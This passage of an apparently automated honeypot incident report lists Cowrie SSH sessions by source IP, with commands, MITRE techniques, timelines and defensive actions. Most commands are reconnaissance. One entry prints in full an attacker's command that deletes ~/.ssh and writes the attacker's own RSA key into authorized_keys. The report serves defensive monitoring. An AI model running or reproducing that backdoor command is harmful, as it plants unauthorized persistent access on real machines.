| `2026-03-21 05:12:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf1d9bbdb047

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-03-21 05:17 |
| **Last Seen** | 2026-03-21 05:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:17:35` | `cowrie.session.connect` |
| `2026-03-21 05:17:35` | `cowrie.client.version` |
| `2026-03-21 05:17:36` | `cowrie.client.kex` |
| `2026-03-21 05:17:36` | `cowrie.login.success` |
| `2026-03-21 05:17:37` | `cowrie.session.params` |
| `2026-03-21 05:17:37` | `cowrie.command.input` |
| `2026-03-21 05:17:37` | `cowrie.command.failed` |
| `2026-03-21 05:17:37` | `cowrie.log.closed` |
| `2026-03-21 05:17:38` | `cowrie.session.params` |
| `2026-03-21 05:17:38` | `cowrie.command.input` |
| `2026-03-21 05:17:38` | `cowrie.session.file_download` |
| `2026-03-21 05:17:38` | `cowrie.log.closed` |
| `2026-03-21 05:17:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dec29b7a79b7

| Field | Detail |
|---|---|
| **Source IP** | `172.214.209[.]153` |
| **First Seen** | 2026-03-21 05:17 |
| **Last Seen** | 2026-03-21 05:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:17:41` | `cowrie.session.connect` |
| `2026-03-21 05:17:41` | `cowrie.client.version` |
| `2026-03-21 05:17:41` | `cowrie.client.kex` |
| `2026-03-21 05:17:42` | `cowrie.login.success` |
| `2026-03-21 05:17:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.214.209[.]153` to AbuseIPDB if not already reported
- [ ] Block `172.214.209[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90320f3f56e5

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 05:18 |
| **Last Seen** | 2026-03-21 05:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:18:48` | `cowrie.session.connect` |
| `2026-03-21 05:18:48` | `cowrie.client.version` |
| `2026-03-21 05:18:48` | `cowrie.client.kex` |
| `2026-03-21 05:18:49` | `cowrie.login.success` |
| `2026-03-21 05:18:49` | `cowrie.session.params` |
| `2026-03-21 05:18:49` | `cowrie.command.input` |
| `2026-03-21 05:18:49` | `cowrie.log.closed` |
| `2026-03-21 05:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1ea7bf44b6f

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 05:25 |
| **Last Seen** | 2026-03-21 05:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `whoami` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:25:38` | `cowrie.session.connect` |
| `2026-03-21 05:25:38` | `cowrie.client.version` |
| `2026-03-21 05:25:39` | `cowrie.client.kex` |
| `2026-03-21 05:25:39` | `cowrie.login.success` |
| `2026-03-21 05:25:40` | `cowrie.session.params` |
| `2026-03-21 05:25:40` | `cowrie.command.input` |
| `2026-03-21 05:25:40` | `cowrie.log.closed` |
| `2026-03-21 05:25:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e60f6274a7a2

| Field | Detail |
|---|---|
| **Source IP** | `102.90.34[.]90` |
| **First Seen** | 2026-03-21 05:27 |
| **Last Seen** | 2026-03-21 05:32 |
| **Session Duration** | 303s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:27:39` | `cowrie.session.connect` |
| `2026-03-21 05:27:40` | `cowrie.client.version` |
| `2026-03-21 05:27:40` | `cowrie.client.kex` |
| `2026-03-21 05:27:42` | `cowrie.login.success` |
| `2026-03-21 05:27:43` | `cowrie.direct-tcpip.request` |
| `2026-03-21 05:32:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.90.34[.]90` to AbuseIPDB if not already reported
- [ ] Block `102.90.34[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4db2c3ac4d13

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]49` |
| **First Seen** | 2026-03-21 05:29 |
| **Last Seen** | 2026-03-21 05:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:29:04` | `cowrie.session.connect` |
| `2026-03-21 05:29:05` | `cowrie.client.version` |
| `2026-03-21 05:29:05` | `cowrie.client.kex` |
| `2026-03-21 05:29:07` | `cowrie.login.success` |
| `2026-03-21 05:29:07` | `cowrie.direct-tcpip.request` |
| `2026-03-21 05:29:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]49` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca75fa00bb9c

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 05:32 |
| **Last Seen** | 2026-03-21 05:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:32:02` | `cowrie.session.connect` |
| `2026-03-21 05:32:02` | `cowrie.client.version` |
| `2026-03-21 05:32:02` | `cowrie.client.kex` |
| `2026-03-21 05:32:03` | `cowrie.login.success` |
| `2026-03-21 05:32:03` | `cowrie.session.params` |
| `2026-03-21 05:32:03` | `cowrie.command.input` |
| `2026-03-21 05:32:03` | `cowrie.log.closed` |
| `2026-03-21 05:32:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26f2201f65ae

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 05:38 |
| **Last Seen** | 2026-03-21 05:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:38:40` | `cowrie.session.connect` |
| `2026-03-21 05:38:40` | `cowrie.client.version` |
| `2026-03-21 05:38:40` | `cowrie.client.kex` |
| `2026-03-21 05:38:41` | `cowrie.login.success` |
| `2026-03-21 05:38:42` | `cowrie.session.params` |
| `2026-03-21 05:38:42` | `cowrie.command.input` |
| `2026-03-21 05:38:42` | `cowrie.log.closed` |
| `2026-03-21 05:38:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff1172d1e59f

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 05:45 |
| **Last Seen** | 2026-03-21 05:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `ssh -V` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:45:14` | `cowrie.session.connect` |
| `2026-03-21 05:45:14` | `cowrie.client.version` |
| `2026-03-21 05:45:14` | `cowrie.client.kex` |
| `2026-03-21 05:45:15` | `cowrie.login.success` |
| `2026-03-21 05:45:15` | `cowrie.session.params` |
| `2026-03-21 05:45:15` | `cowrie.command.input` |
| `2026-03-21 05:45:15` | `cowrie.log.closed` |
| `2026-03-21 05:45:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ad3ba6c9a9a

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 05:51 |
| **Last Seen** | 2026-03-21 05:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:51:55` | `cowrie.session.connect` |
| `2026-03-21 05:51:55` | `cowrie.client.version` |
| `2026-03-21 05:51:55` | `cowrie.client.kex` |
| `2026-03-21 05:51:56` | `cowrie.login.success` |
| `2026-03-21 05:51:56` | `cowrie.session.params` |
| `2026-03-21 05:51:56` | `cowrie.command.input` |
| `2026-03-21 05:51:57` | `cowrie.log.closed` |
| `2026-03-21 05:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b641223d8142

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 05:58 |
| **Last Seen** | 2026-03-21 05:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 05:58:30` | `cowrie.session.connect` |
| `2026-03-21 05:58:30` | `cowrie.client.version` |
| `2026-03-21 05:58:31` | `cowrie.client.kex` |
| `2026-03-21 05:58:31` | `cowrie.login.success` |
| `2026-03-21 05:58:32` | `cowrie.session.params` |
| `2026-03-21 05:58:32` | `cowrie.command.input` |
| `2026-03-21 05:58:32` | `cowrie.log.closed` |
| `2026-03-21 05:58:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b25418802f53

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 06:05 |
| **Last Seen** | 2026-03-21 06:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 06:05:29` | `cowrie.session.connect` |
| `2026-03-21 06:05:29` | `cowrie.client.version` |
| `2026-03-21 06:05:29` | `cowrie.client.kex` |
| `2026-03-21 06:05:30` | `cowrie.login.success` |
| `2026-03-21 06:05:30` | `cowrie.session.params` |
| `2026-03-21 06:05:30` | `cowrie.command.input` |
| `2026-03-21 06:05:31` | `cowrie.log.closed` |
| `2026-03-21 06:05:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-794e1cdf1d2e

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 06:12 |
| **Last Seen** | 2026-03-21 06:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 06:12:28` | `cowrie.session.connect` |
| `2026-03-21 06:12:28` | `cowrie.client.version` |
| `2026-03-21 06:12:28` | `cowrie.client.kex` |
| `2026-03-21 06:12:28` | `cowrie.login.success` |
| `2026-03-21 06:12:29` | `cowrie.session.params` |
| `2026-03-21 06:12:29` | `cowrie.command.input` |
| `2026-03-21 06:12:29` | `cowrie.log.closed` |
| `2026-03-21 06:12:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a72292e022f

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 06:19 |
| **Last Seen** | 2026-03-21 06:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 06:19:01` | `cowrie.session.connect` |
| `2026-03-21 06:19:01` | `cowrie.client.version` |
| `2026-03-21 06:19:02` | `cowrie.client.kex` |
| `2026-03-21 06:19:02` | `cowrie.login.success` |
| `2026-03-21 06:19:03` | `cowrie.session.params` |
| `2026-03-21 06:19:03` | `cowrie.command.input` |
| `2026-03-21 06:19:03` | `cowrie.log.closed` |
| `2026-03-21 06:19:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4065ae1932d

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 06:25 |
| **Last Seen** | 2026-03-21 06:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 06:25:58` | `cowrie.session.connect` |
| `2026-03-21 06:25:58` | `cowrie.client.version` |
| `2026-03-21 06:25:58` | `cowrie.client.kex` |
| `2026-03-21 06:25:59` | `cowrie.login.success` |
| `2026-03-21 06:25:59` | `cowrie.session.params` |
| `2026-03-21 06:25:59` | `cowrie.command.input` |
| `2026-03-21 06:25:59` | `cowrie.log.closed` |
| `2026-03-21 06:25:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dd98d6e36f5

| Field | Detail |
|---|---|
| **Source IP** | `111.171.127[.]190` |
| **First Seen** | 2026-03-21 06:27 |
| **Last Seen** | 2026-03-21 06:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 06:27:16` | `cowrie.session.connect` |
| `2026-03-21 06:27:17` | `cowrie.client.version` |
| `2026-03-21 06:27:17` | `cowrie.client.kex` |
| `2026-03-21 06:27:19` | `cowrie.login.success` |
| `2026-03-21 06:27:20` | `cowrie.direct-tcpip.request` |
| `2026-03-21 06:27:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.127[.]190` to AbuseIPDB if not already reported
- [ ] Block `111.171.127[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43ad5c0675c6

| Field | Detail |
|---|---|
| **Source IP** | `58.115.53[.]172` |
| **First Seen** | 2026-03-21 06:28 |
| **Last Seen** | 2026-03-21 06:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 06:28:34` | `cowrie.session.connect` |
| `2026-03-21 06:28:35` | `cowrie.client.version` |
| `2026-03-21 06:28:35` | `cowrie.client.kex` |
| `2026-03-21 06:28:37` | `cowrie.login.success` |
| `2026-03-21 06:28:38` | `cowrie.direct-tcpip.request` |
| `2026-03-21 06:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.115.53[.]172` to AbuseIPDB if not already reported
- [ ] Block `58.115.53[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b72e1e1b173

| Field | Detail |
|---|---|
| **Source IP** | `179.185.227[.]77` |
| **First Seen** | 2026-03-21 06:28 |
| **Last Seen** | 2026-03-21 06:28 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 06:28:45` | `cowrie.session.connect` |
| `2026-03-21 06:28:46` | `cowrie.client.version` |
| `2026-03-21 06:28:46` | `cowrie.client.kex` |
| `2026-03-21 06:28:49` | `cowrie.login.success` |
| `2026-03-21 06:28:50` | `cowrie.direct-tcpip.request` |
| `2026-03-21 06:28:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.227[.]77` to AbuseIPDB if not already reported
- [ ] Block `179.185.227[.]77` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42d79abc201d

| Field | Detail |
|---|---|
| **Source IP** | `4.236.164[.]162` |
| **First Seen** | 2026-03-21 06:32 |
| **Last Seen** | 2026-03-21 06:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `nproc 2>/dev/null || (grep -c '^processor' /proc/cpuinfo 2>/dev/null) || echo 0, grep -c ^processor /proc/cpuinfo 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-03-21 06:32:34` | `cowrie.session.connect` |
| `2026-03-21 06:32:34` | `cowrie.client.version` |
| `2026-03-21 06:32:35` | `cowrie.client.kex` |
| `2026-03-21 06:32:35` | `cowrie.login.success` |
| `2026-03-21 06:32:36` | `cowrie.session.params` |
| `2026-03-21 06:32:36` | `cowrie.command.input` |
| `2026-03-21 06:32:36` | `cowrie.command.input` |
| `2026-03-21 06:32:36` | `cowrie.log.closed` |
| `2026-03-21 06:32:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.236.164[.]162` to AbuseIPDB if not already reported
- [ ] Block `4.236.164[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `223.123.38[.]39` | **15** | 2026-03-21 06:32 | 2026-03-21 06:35 | 3m | 0 | `T1592` | 🟠 MEDIUM |
| `47.238.247[.]149` | **15** | 2026-03-21 02:00 | 2026-03-21 02:12 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `47.242.68[.]55` | **15** | 2026-03-21 01:24 | 2026-03-21 01:33 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `47.243.46[.]164` | **15** | 2026-03-21 01:07 | 2026-03-21 01:24 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `47.238.91[.]108` | **13** | 2026-03-21 01:16 | 2026-03-21 01:30 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.82[.]218` | **11** | 2026-03-21 01:14 | 2026-03-21 01:30 | 14m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `172.214.209[.]153` | **10** | 2026-03-21 04:55 | 2026-03-21 05:17 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `8.222.205[.]160` | **9** | 2026-03-21 01:25 | 2026-03-21 01:32 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `16.58.56[.]214` | **6** | 2026-03-21 03:55 | 2026-03-21 04:04 | 0m | 0 | `T1592` | 🟢 LOW |
| `185.233.3[.]95` | **3** | 2026-03-21 05:00 | 2026-03-21 05:05 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.174[.]45` | **2** | 2026-03-21 02:59 | 2026-03-21 03:09 | 1m | 0 | `T1592` | 🟢 LOW |
| `135.119.89[.]57` | **2** | 2026-03-21 03:06 | 2026-03-21 03:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.48.161[.]42` | 1 | 2026-03-21 05:36 | 2026-03-21 05:36 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.246.89[.]68` | 1 | 2026-03-21 00:09 | 2026-03-21 00:10 | 71s | 0 | `T1592` | 🟢 LOW |
| `112.26.101[.]76` | 1 | 2026-03-21 04:38 | 2026-03-21 04:38 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.1.61[.]81` | 1 | 2026-03-21 02:21 | 2026-03-21 02:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.1.61[.]81` | 1 | 2026-03-21 04:58 | 2026-03-21 05:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.39[.]202` | 1 | 2026-03-21 04:18 | 2026-03-21 04:19 | 5s | 0 | `T1592` | 🟢 LOW |
| `121.159.70[.]244` | 1 | 2026-03-21 03:04 | 2026-03-21 03:04 | 13s | 0 | `T1592` | 🟢 LOW |
| `122.170.111[.]140` | 1 | 2026-03-21 00:15 | 2026-03-21 00:15 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.105[.]165` | 1 | 2026-03-21 02:01 | 2026-03-21 02:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.94.74[.]94` | 1 | 2026-03-21 02:49 | 2026-03-21 02:49 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.171.9[.]22` | 1 | 2026-03-21 05:27 | 2026-03-21 05:27 | 5s | 0 | `T1592` | 🟢 LOW |
| `183.220.237[.]230` | 1 | 2026-03-21 06:38 | 2026-03-21 06:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.233.85[.]194` | 1 | 2026-03-21 02:21 | 2026-03-21 02:21 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `183.237.33[.]162` | 1 | 2026-03-21 04:08 | 2026-03-21 04:08 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `184.81.254[.]140` | 1 | 2026-03-21 00:24 | 2026-03-21 00:24 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `190.219.113[.]70` | 1 | 2026-03-21 06:17 | 2026-03-21 06:18 | 31s | 0 | `T1592` | 🟢 LOW |
| `201.71.175[.]163` | 1 | 2026-03-21 05:05 | 2026-03-21 05:05 | 31s | 0 | `T1592` | 🟢 LOW |
| `223.197.145[.]126` | 1 | 2026-03-21 00:04 | 2026-03-21 00:04 | 5s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.93.128[.]179` | 1 | 2026-03-21 04:57 | 2026-03-21 04:57 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.93.154[.]207` | 1 | 2026-03-21 01:15 | 2026-03-21 01:15 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `37.28.177[.]141` | 1 | 2026-03-21 03:00 | 2026-03-21 03:00 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `39.170.9[.]163` | 1 | 2026-03-21 05:00 | 2026-03-21 05:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `4.236.164[.]162` | 1 | 2026-03-21 03:14 | 2026-03-21 03:14 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `4.236.164[.]162` | 1 | 2026-03-21 06:39 | 2026-03-21 06:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.30.161[.]197` | 1 | 2026-03-21 03:59 | 2026-03-21 03:59 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.151[.]11` | 1 | 2026-03-21 00:50 | 2026-03-21 00:50 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.153[.]13` | 1 | 2026-03-21 05:56 | 2026-03-21 05:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.206.201[.]253` | 1 | 2026-03-21 01:04 | 2026-03-21 01:04 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-03-21 06:13 | 2026-03-21 06:14 | 50s | 0 | `T1592` | 🟢 LOW |
